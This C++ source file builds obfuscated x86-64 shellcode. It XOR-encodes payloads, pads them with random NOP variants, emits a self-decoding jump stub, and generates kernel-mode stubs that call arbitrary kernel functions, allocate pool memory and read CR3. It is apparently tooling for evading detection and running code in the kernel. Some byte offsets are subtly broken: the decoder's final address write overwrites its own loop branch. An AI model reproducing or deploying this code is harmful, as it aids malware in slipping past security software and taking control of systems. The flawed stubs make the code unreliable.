#include "ShellcodeUtils.h"
#include <algorithm>
#include <chrono>

// Initialize static members
std::random_device ShellcodeUtils::rd;
std::mt19937 ShellcodeUtils::gen(rd());
std::uniform_int_distribution<uint32_t> ShellcodeUtils::dist(1, UINT32_MAX);

uint32_t ShellcodeUtils::GenerateRandomKey() {
    return dist(gen);
}

std::vector<uint8_t> ShellcodeUtils::XorEncode(const std::vector<uint8_t>& data, uint32_t key) {
    std::vector<uint8_t> encoded = data;
    uint8_t* keyBytes = reinterpret_cast<uint8_t*>(&key);
    
    for (size_t i = 0; i < encoded.size(); i++) {
        encoded[i] ^= keyBytes[i % sizeof(key)];
    }
    
    return encoded;
}

void ShellcodeUtils::RandomizeNops(std::vector<uint8_t>& shellcode) {
    // List of equivalent NOP instructions
    static const std::vector<std::vector<uint8_t>> nopEquivalents = {
        {0x90},                     // NOP
        {0x66, 0x90},              // 66 NOP
        {0x0F, 0x1F, 0x00},        // NOP DWORD ptr [EAX]
        {0x0F, 0x1F, 0x40, 0x00},  // NOP DWORD ptr [EAX + 00H]
        {0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00} // 66 NOP WORD ptr [EAX + EAX*1 + 00H]
    };
    
    std::vector<uint8_t> result;
    result.reserve(shellcode.size() * 2); // Reserve extra space for NOPs
    
    // Insert random NOPs between instructions
    for (size_t i = 0; i < shellcode.size(); i++) {
        result.push_back(shellcode[i]);
        
        // Randomly insert NOPs (20% chance)
        if (dist(gen) % 5 == 0) {
            const auto& nop = nopEquivalents[dist(gen) % nopEquivalents.size()];
            result.insert(result.end(), nop.begin(), nop.end());
        }
    }
    
    shellcode = std::move(result);
}

std::vector<std::vector<uint8_t>> ShellcodeUtils::ChunkShellcode(const std::vector<uint8_t>& shellcode, size_t chunkSize) {
    std::vector<std::vector<uint8_t>> chunks;
    
    for (size_t i = 0; i < shellcode.size(); i += chunkSize) {
        size_t remainingBytes = std::min(chunkSize, shellcode.size() - i);
        chunks.emplace_back(shellcode.begin() + i, shellcode.begin() + i + remainingBytes);
    }
    
    return chunks;
}

std::vector<uint8_t> ShellcodeUtils::CreateDecoderStub(uint32_t key, uint64_t targetAddr, size_t size) {
    // Create a decoder stub that will:
    // 1. XOR decode the shellcode
    // 2. Jump to it
    std::vector<uint8_t> decoder = {
        0x48, 0xB9,                   // mov rcx, shellcode_addr
        0x00, 0x00, 0x00, 0x00,      // (placeholder for address)
        0x00, 0x00, 0x00, 0x00,
        0x48, 0xBA,                   // mov rdx, size
        0x00, 0x00, 0x00, 0x00,      // (placeholder for size)
        0x00, 0x00, 0x00, 0x00,
        0x48, 0xBB,                   // mov rbx, key
        0x00, 0x00, 0x00, 0x00,      // (placeholder for key)
        0x00, 0x00, 0x00, 0x00,
        // Decode loop:
        0x48, 0x31, 0x19,            // xor [rcx], rbx
        0x48, 0xFF, 0xC1,            // inc rcx
        0x48, 0xFF, 0xCA,            // dec rdx
        0x75, 0xF6,                  // jnz decode_loop
        0x48, 0xB8,                   // mov rax, shellcode_addr
        0x00, 0x00, 0x00, 0x00,      // (placeholder for address)
        0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0                    // jmp rax
    };
    
    // Fill in the placeholders
    *(uint64_t*)&decoder[2] = targetAddr;     // shellcode address
    *(uint64_t*)&decoder[12] = size;          // size
    *(uint64_t*)&decoder[22] = key;           // key
    *(uint64_t*)&decoder[39] = targetAddr;    // jump target
    
    return decoder;
}

ObfuscatedShellcode ShellcodeUtils::ObfuscateShellcode(const std::vector<uint8_t>& shellcode) {
    ObfuscatedShellcode result;
    
    // Generate a random key
    result.key = GenerateRandomKey();
    
    // Add some randomization
    auto randomized = shellcode;
    RandomizeNops(randomized);
    
    // Encode the shellcode
    result.code = XorEncode(randomized, result.key);
    
    // Create decoder stub
    result.decoder = CreateDecoderStub(result.key, 0, result.code.size()); // Address will be filled in later
    
    // Set chunk size
    result.chunkSize = DEFAULT_CHUNK_SIZE;
    
    // Find safe points for chunking (after complete instructions)
    result.safePoints.push_back(0);
    for (size_t i = 0; i < result.code.size(); i++) {
        // This is a simplified way to find instruction boundaries
        // In a real implementation, you'd need proper x86_64 instruction parsing
        if (result.code[i] == 0xC3 ||  // ret
            result.code[i] == 0x90 ||  // nop
            result.code[i] == 0xCC) {  // int3
            result.safePoints.push_back(i + 1);
        }
    }
    result.safePoints.push_back(result.code.size());
    
    return result;
}

std::vector<uint8_t> ShellcodeUtils::CreateFastReturnShellcode(uint64_t functionAddress) {
    std::vector<uint8_t> sc = {
        0x48, 0xB8,                   // mov rax, ...
        0, 0, 0, 0, 0, 0, 0, 0,      // function address placeholder
        0xFF, 0xD0,                   // call rax
        0xC3                          // ret
    };
    *(uint64_t*)&sc[2] = functionAddress;
    return sc;
}

std::vector<uint8_t> ShellcodeUtils::CreateCR3ReadShellcode() {
    // Simple shellcode to read CR3 register
    std::vector<uint8_t> shellcode = {
        0x0F, 0x20, 0xD8,           // mov eax, cr3
        0xC3                        // ret
    };
    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateKernelFunctionCallShellcode(uint64_t function, uint64_t arg1, uint64_t arg2) {
    std::vector<uint8_t> shellcode = {
        0x48, 0x83, 0xEC, 0x28,                 // sub rsp, 28h
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rcx, arg1
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rdx, arg2
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rax, function
        0xFF, 0xD0,                             // call rax
        0x48, 0x83, 0xC4, 0x28,                 // add rsp, 28h
        0xC3                                     // ret
    };

    // Fill in the parameters
    *(uint64_t*)&shellcode[6] = arg1;
    *(uint64_t*)&shellcode[16] = arg2;
    *(uint64_t*)&shellcode[26] = function;

    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateJumpShellcode(uint64_t targetAddr) {
    std::vector<uint8_t> shellcode = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00,                 // mov rax, targetAddr
        0xFF, 0xE0                              // jmp rax
    };

    // Fill in the target address
    *(uint64_t*)&shellcode[2] = targetAddr;

    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateExecShellcode(uint64_t shellcodeAddr) {
    std::vector<uint8_t> shellcode = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00,                 // mov rax, shellcodeAddr
        0xFF, 0xD0,                             // call rax
        0xC3                                     // ret
    };

    // Fill in the shellcode address
    *(uint64_t*)&shellcode[2] = shellcodeAddr;

    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateAllocationShellcode(uint64_t exAllocatePoolAddr, uint64_t poolType, uint64_t size) {
    std::vector<uint8_t> shellcode = {
        0x48, 0x83, 0xEC, 0x28,                 // sub rsp, 28h
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rcx, poolType
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rdx, size
        0x49, 0xB8, 0x4D, 0x4D, 0x64, 0x72,      
        0x00, 0x00, 0x00, 0x00,                 // mov r8, 'Mmdr' (tag)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rax, ExAllocatePool2
        0xFF, 0xD0,                             // call rax
        0x48, 0x83, 0xC4, 0x28,                 // add rsp, 28h
        0xC3                                     // ret
    };

    // Fill in the parameters
    *(uint64_t*)&shellcode[6] = poolType;
    *(uint64_t*)&shellcode[16] = size;
    *(uint64_t*)&shellcode[36] = exAllocatePoolAddr;

    return shellcode;
}
